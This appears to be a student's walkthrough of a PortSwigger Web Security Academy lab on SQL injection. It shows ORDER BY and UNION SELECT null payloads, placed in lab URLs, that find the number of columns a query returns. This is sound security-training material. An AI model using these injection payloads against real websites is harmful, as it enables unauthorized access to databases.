---
title: Lab 1 SQL Injection - Port Swigger

---

# Lab 3 SQL Injection - Port Swigger

## Statement
  This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.


## Solution

Home page is 
![image](https://hackmd.io/_uploads/HkVaryb9R.png)

In order to obtain the number of columns in the query we have to perform a query, for example searching by the gift category. The link is 

[https://0aa9008104939cd882a2c9cc00f000b5.web-security-academy.net/filter?category=Gifts]()

The SQL query may be something like

`SELECT * FROM products WHERE category = 'Gifts'`

We want to know the number of columns, so we can try to order the columns by its index. If we get an error is because the column with that index doesn't exist. 

`SELECT * FROM products WHERE category = 'Gifts' order by 2`

We can try the query above by adding a payload in the link:

[https://0a5d007004f6ccc385cb9171007b00f6.web-security-academy.net/filter?category=Gifts%27+order+by+2--]()

And we see that the products are ordered by its name, so the name is the column with index 2.

![image](https://hackmd.io/_uploads/rkLjKJWqR.png)

Let's try ordering the products by its price, probably column 3.

![image](https://hackmd.io/_uploads/B1rk9k-50.png)

We did it! Let's see if there exists a fourth column...

![image](https://hackmd.io/_uploads/B1gz5J-qC.png)

The fourth column doesn't exist. We know there are 3 columns, but we want a UNION attack that returns an additional row containing null values. This is obtained by the next query, taking into account that null type adjusts any other data type.

`SELECT * FROM products WHERE category = 'Gifts' union select null, null, null`

To obtain this query, we can use the link:

[https://0a5d007004f6ccc385cb9171007b00f6.web-security-academy.net/filter?category=Gifts%27+union+select+null+,+null+,+null--]()

![image](https://hackmd.io/_uploads/BJJ83ybcR.png)

This lab is finished!

